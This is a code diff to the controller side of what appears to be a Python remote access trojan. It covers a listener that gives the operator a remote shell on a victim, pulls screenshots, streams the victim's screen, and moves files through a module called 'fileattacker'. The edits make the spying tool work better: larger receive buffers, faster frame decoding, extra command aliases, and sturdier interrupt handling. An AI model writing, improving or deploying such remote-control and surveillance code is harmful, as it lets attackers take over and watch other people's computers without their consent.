@@ -13,6 +13,7 @@ import threading
 import time
 from fileattacker import download_file, upload_file
 from termcolor import cprint
+import numpy as np
 
 def main_con():
     soc = None
@@ -34,7 +35,7 @@ def main_con():
             finally:
                 conn.close()
     except KeyboardInterrupt:
-        exit('[-] exiting listener')
+        exit("exiting handler")
     except Exception as e:
         print(f'{e}')
     finally:
@@ -183,6 +184,7 @@ def screen_record(host="0.0.0.0", port=9999):
 
     cprint("[*] Connecting", 'blue')
     conn, addr = server.accept()
+    conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
     cprint(f"[+] Connected {addr}", 'green') 
 
     data = b""
@@ -194,7 +196,7 @@ def screen_record(host="0.0.0.0", port=9999):
     while True:
         try:
             while len(data) < payload_size:
-                packet = conn.recv(4096)
+                packet = conn.recv(65536)
                 if not packet:
                     return 
                 data += packet
@@ -204,13 +206,13 @@ def screen_record(host="0.0.0.0", port=9999):
             frame_size = struct.unpack("Q", packed_size)[0]
 
             while len(data) < frame_size:
-                data += conn.recv(4096)
+                data += conn.recv(65536)
 
             frame_data = data[:frame_size]
             data = data[frame_size:]
 
-            frame = pickle.loads(frame_data)
-            frame = cv2.resize(frame, (MAX_WIDTH, MAX_HEIGHT))
+            np_data = np.frombuffer(frame_data, dtype=np.uint8)
+            frame = cv2.imdecode(np_data, cv2.IMREAD_COLOR)
             
             cv2.imshow("Screen Share | Q / ESC = Quit", frame)
 
@@ -279,7 +281,7 @@ def shellc(_target):
     n = 0
     p = 0
     cprint("[!] Type 'help' for help", 'yellow')
-    cprint("[!] Use 'exit' to fully exit both server and client", 'yellow')
+    cprint("[!] Use 'exit' or 'quit' to fully exit both server and client", 'yellow')
     cprint("[!] Use 'bg' or 'background' to background the current shell", 'yellow')
     while True:
         try:
@@ -310,6 +312,7 @@ def shellc(_target):
                 konversi_byte_stream()
             elif perintah ==  'screen_shot':
                 n += 1
+                time.sleep(0.1)
                 download_file(_target,"ss"+str(n)+".png")
             elif perintah == 'screen_share':
                 screen_record(host='0.0.0.0', port=9991) 
@@ -319,7 +322,7 @@ def shellc(_target):
                     ================================
                     -exit/quit >> exit the process
 
-                    -background >> background the process
+                    -background/bg >> background the process
                     
                     -clear     >> clear terminal
                     ================================
@@ -395,5 +398,8 @@ def shellc(_target):
                 print(hasil)
         except Exception as e:
             print(f"[error] {e}")
+        except KeyboardInterrupt:
+            print("\n")
+            pass
 
 main_con()
